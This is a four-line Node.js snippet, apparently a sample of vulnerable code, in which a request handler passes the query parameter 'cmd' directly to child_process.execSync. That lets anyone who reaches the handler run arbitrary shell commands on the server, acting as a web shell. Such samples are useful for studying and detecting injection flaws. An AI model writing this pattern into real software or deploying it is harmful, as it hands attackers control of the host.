const child_process = require("child_process");
function handler(req) {
  child_process.execSync(req.query.cmd);
}
